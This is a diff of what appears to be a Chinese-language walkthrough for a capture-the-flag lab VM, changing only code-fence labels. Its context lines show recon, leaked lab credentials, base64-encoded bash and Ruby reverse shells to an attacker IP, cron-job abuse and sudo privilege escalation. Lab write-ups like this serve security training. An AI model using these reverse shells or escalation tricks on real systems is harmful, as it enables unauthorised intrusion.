@@ -27,7 +27,7 @@ My first ever VM! Enjoy
 
 ## 信息搜集
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo nmap --min-rate=2000 -v -A -p- 192.168.56.128
 Nmap scan report for bogon (192.168.56.128)
@@ -61,7 +61,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 将 `midnight.coffee` 添加为 hosts 记录之后，尝试进行目录爆破和子域名爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 --append-domain -u http://midnight.coffee/
 ===============================================================
@@ -139,7 +139,7 @@ To login into the server use: tuna : 1L0v3_TuN4_Very_Much
 
 ## User tuna
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs tuna@192.168.56.128
 [14:20:20] Welcome to pwncat 🐈!
@@ -219,7 +219,7 @@ SHELL=/bin/sh
 
 尝试利用这个定时任务
 
-```shell
+```bash
 (remote) tuna@coffee-shop:/home/tuna$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNy85OTk5IDA+JjE= | base64 -d
 bash -i >& /dev/tcp/192.168.56.127/999
 (remote) tuna@coffee-shop:/home/tuna$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNy85OTk5IDA+JjE= | base64 -d > /tmp/shell-1.sh
@@ -227,7 +227,7 @@ bash -i >& /dev/tcp/192.168.56.127/999
 
 稍等片刻，即可收到回连的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [14:26:37] Welcome to pwncat 🐈!
@@ -246,7 +246,7 @@ DR1NK1NG-C0FF33-4T-N1GHT
 
 ## 提权至 root
 
-```shell
+```bash
 (remote) shopadmin@coffee-shop:/home/shopadmin$ sudo -l
 Matching Defaults entries for shopadmin on coffee-shop:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -257,7 +257,7 @@ User shopadmin may run the following commands on coffee-shop:
 
 那么就很简单了，中间可以插入任意参数的话，就可以继续构造反弹 shell
 
-```shell
+```bash
 # Machine
 (remote) shopadmin@coffee-shop:/home/shopadmin$ echo cmVxdWlyZSAnc29ja2V0JwoKcyA9IFNvY2tldC5uZXcgMiwxCnMuY29ubmVjdCBTb2NrZXQuc29ja2FkZHJfaW4gOTk5OCwgJzE5Mi4xNjguNTYuMTI3JwoKWzAsMSwyXS5lYWNoIHsgfGZkfCBzeXNjYWxsIDMzLCBzLmZpbGVubywgZmQgfQpleGVjICcvYmluL3NoIC1pJwo= | base64 -d
 require 'socket'
@@ -275,7 +275,7 @@ exec '/bin/sh -i'
 
 ## User root
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9998
 [14:33:20] Welcome to pwncat 🐈!
